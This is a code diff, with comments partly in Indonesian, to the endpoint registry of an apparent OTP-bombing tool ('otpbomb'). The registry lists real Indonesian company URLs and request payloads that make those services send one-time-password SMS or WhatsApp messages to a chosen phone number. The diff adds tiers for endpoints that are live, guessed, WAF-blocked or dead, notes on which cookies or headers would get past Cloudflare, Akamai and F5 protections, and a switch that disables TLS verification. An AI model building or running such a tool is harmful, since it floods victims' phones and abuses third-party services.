@@ -1,17 +1,22 @@
 """Provider registry — OTP-trigger endpoints.
 
-Two tiers:
+Empat tier:
 
-  tier="live"   probed from this host and answered non-404 on the wire (JSON
-                error bodies count: the route exists and the phone reaches the
-                backend). Payloads tuned for the ones that were decoded.
-  tier="guess"  hand-written from brand shape; may 404. Bring your own with
-                --providers-file or regenerate with `python3 -m otpbomb.discover`.
+  tier="live"     di-probe, menjawab tanpa cookie. Payload yang sudah
+                  di-decode dipakai apa adanya.
+  tier="guess"    tulisan tangan dari bentuk brand; sering 404.
+  tier="blocked"  endpoint hidup tapi WAF menolak (CF/Akamai/F5 401/403) —
+                  butuh cf_clearance/cookie/proxy.
+  tier="dead"     host/path mati (NXDOMAIN, 504, redirect loop).
+
+Default `blast` hanya menyapu tier `live`; `probe` menyapu semuanya.
 
 Fields per entry (JSON-serialisable, also loadable via --providers-file):
   name, category (wa|sms), url, method, form, json_body, headers, pre_url,
-  extract, success_codes, success_contains, fail_contains, tier, note
+  extract, success_codes, success_contains, fail_contains, soft_contains,
+  tier, insecure, note
 
+`insecure` mematikan verifikasi TLS per-endpoint (host dengan chain rusak).
 Run `probe --tier all` to re-rank before a job — endpoints rot fast.
 """
 from __future__ import annotations
@@ -51,6 +56,7 @@ class Provider:
     fail_contains: tuple = ()
     soft_contains: tuple = ()
     tier: str = "guess"
+    insecure: bool = False
     note: str = ""
 
     @classmethod
@@ -261,8 +267,10 @@ GUESS = [
        json_body={"phoneNumber": "{local}", "platform": "wa"}),
     _p("sampingan", "sms", "https://srv3.sampingan.co.id/auth/generate-otp",
        json_body={"countryCode": "+62", "phoneNumber": "{local}"}),
-    _p("trimegah", "sms", "https://sbn.trimegah.id/agent/register/sendOtp",
-       form={"noHp": "{local}", "email": "otp{rand16}@mail.id"}),
+    _p("trimegah", "sms", "https://sbn.trimegah.id/agent/register/otp/send",
+       form={"noHp": "{digits}"},
+       insecure=True,  # sertifikat sbn.trimegah.id chain-nya tidak lengkap
+       note="balas halaman OTP (bukan JSON) kalau kirim diterima; verify TLS dimatikan"),
     _p("danacepat", "sms", "https://battlefront.danacepat.com/v1/auth/common/phone/send-code",
        form={"mobile_no": "{local}"}),
     _p("tri", "sms", "https://registrasi.tri.co.id/daftar/generateOTP",
@@ -284,11 +292,60 @@ def by_name(name: str) -> Provider | None:
 
 
 def _tier_ok(p: Provider, tier: str) -> bool:
-    if tier == "live":
-        return p.tier == "live"
-    if tier == "guess":
-        return p.tier == "guess"
-    return True
+    if tier == "all":
+        return True
+    return p.tier == tier
+
+
+# ==========================================================================
+# Kesehatan endpoint — hasil probe ulang. Entri yang host-nya sudah mati
+# (DNS NXDOMAIN / hang) atau yang ditolak WAF dari IP datacenter dipindah
+# keluar dari tier default supaya `blast` biasa tidak penuh ERROR/BLOCKED.
+# Panggil lagi dengan --tier blocked / dead / all.
+# ==========================================================================
+_DEAD = {
+    "halodoc": "api.halodoc.com NXDOMAIN; gateway web 403/504",
+    "alodokter": "api-gateway.* 504 (backend mati)",
+    "klikdokter": "api.klikdokter.com NXDOMAIN",
+    "mamikos": "api.mamikos.com NXDOMAIN, www hanya SPA fallback",
+    "ruangguru": "api.ruangguru.com NXDOMAIN",
+    "orami": "api.orami.co.id NXDOMAIN (passport-api tanpa route otp publik)",
+    "pinhome": "api.pinhome.id NXDOMAIN",
+    "sayurbox": "api.sayurbox.com + m.sayurbox.com tidak menjawab",
+    "danacepat": "battlefront.danacepat.com / danacepat.com NXDOMAIN",
+    "jdid": "jd.id gugur dari DNS (hanya m.jd.id lewat CDN)",
+    "sampingan": "srv3.sampingan.co.id connect >25s, tidak pernah balas",
+    "smartfren2": "www.smartfren.com/id/api/otp redirect loop 50x",
+    "bi-fast": "www.bfi.co.id/api/... 404",
+}
+_BLOCKED = {
+    "ajaib": "Cloudflare 403 (butuh cf_clearance/cookie)",
+    "pluang": "Akamai 403 (butuh cookie bot-manager)",
+    "sociolla": "Cloudflare 403",
+    "grab": "api.grab.com 403 (butuh x-mts/x-request-id app)",
+    "grab-wa": "api.grab.com 403 (butuh x-mts/x-request-id app)",
+    "carsome": "Cloudflare 403",
+    "cmsapi": "403 halaman WAF mapclub",
+    "misteraladin": "Cloudflare 403",
+    "metroindonesia": "403 access.metroindonesia.com",
+    "klikindomaret": "Cloudflare 403",
+    "kredinesia": "403 api.kredinesia.id",
+    "danacita": "401 api.danacita.co.id (butuh header app)",
+    "byu": "F5/BIG-IP ASM 'Request Rejected' (WAF)",
+    "danamon": "F5/BIG-IP ASM 'Request Rejected' (WAF)",
+}
+
+for _name, _why in _DEAD.items():
+    _p_ = by_name(_name)
+    if _p_ is not None:
+        _p_.tier = "dead"
+        _p_.note = (_p_.note + "; " if _p_.note else "") + _why
+
+for _name, _why in _BLOCKED.items():
+    _p_ = by_name(_name)
+    if _p_ is not None:
+        _p_.tier = "blocked"
+        _p_.note = (_p_.note + "; " if _p_.note else "") + _why
 
 
 def select(only: list[str] | None = None, skip: list[str] | None = None,
